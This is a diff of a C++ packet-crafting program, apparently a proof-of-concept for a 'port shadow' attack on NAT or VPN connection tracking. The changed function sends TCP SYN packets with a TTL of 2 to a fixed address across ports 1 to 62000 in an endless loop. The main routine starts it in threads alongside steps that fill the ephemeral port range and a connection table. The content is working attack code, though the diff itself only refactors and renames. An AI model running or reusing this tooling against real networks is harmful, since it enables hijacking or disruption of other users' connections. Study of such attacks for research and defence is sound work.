@@ -20,7 +20,8 @@ using namespace Tins;
 
 string iface;
 
-void _tcp_attack_packets() {
+void tcp_attack_packets_fn() {
+
 	/*Send a bunch of TCP SYN's from attacker*/
 #define PORT_RANGE_START 1 
 #define PORT_RANGE_END 62000
@@ -28,31 +29,22 @@ void _tcp_attack_packets() {
 	PacketSender sender;
 	NetworkInterface iface(iface);
 
-	IP atk_pkt = IP("192.168.3.131") / TCP(PORT_RANGE_START, 80);
-	IP& atk_ip = atk_pkt.rfind_pdu<IP>();
-	TCP& atk_tcp = atk_pkt.rfind_pdu<TCP>();
-	atk_tcp.set_flag(TCP::SYN, 1);
-	atk_tcp.seq(0);
-	atk_tcp.ack_seq(0);
-
+	IP pkt = IP("192.168.3.131") / TCP(PORT_RANGE_START, 80);
+	IP& ip = pkt.rfind_pdu<IP>();
+	TCP& tcp = pkt.rfind_pdu<TCP>();
+	tcp.set_flag(TCP::SYN, 1);
+	tcp.seq(1);
+	tcp.ack_seq(0);
 
 	while (true) {
 		for (unsigned short dport = PORT_RANGE_START;
 				dport < PORT_RANGE_END; dport++) {
 				tcp.dport(dport);
 				ip.ttl(2);
-				sender.send(atk_pkt,iface);
+				sender.send(pkt, iface);
 		}	
 		usleep(10000000);
 	}
-}
-
-
-void tcp_attack_packets() {
-	SnifferConfiguration config;
-	config.set_promisc_mode(true);
-	Sniffer sniffer("any", config);
-	sniffer.sniff_loop(_tcp_attack_packets);
 }
 
 void tcp_fill_ephemeral_port_range() {
@@ -288,7 +280,7 @@ int main(int argc, char** argv) {
 			tcp_fill_ephemeral_port_range_thread.detach();
 
 			// 2. Start the thread to create the port shadow 
-			thread tcp_attack_packets_thread(tcp_attack_packets);
+			thread tcp_attack_packets_thread(tcp_attack_packets_fn);
 			tcp_attack_packets_thread.detach();
 
 			// 3. Start the thread to fill the table by sending ACKs to SYN/ACKS 
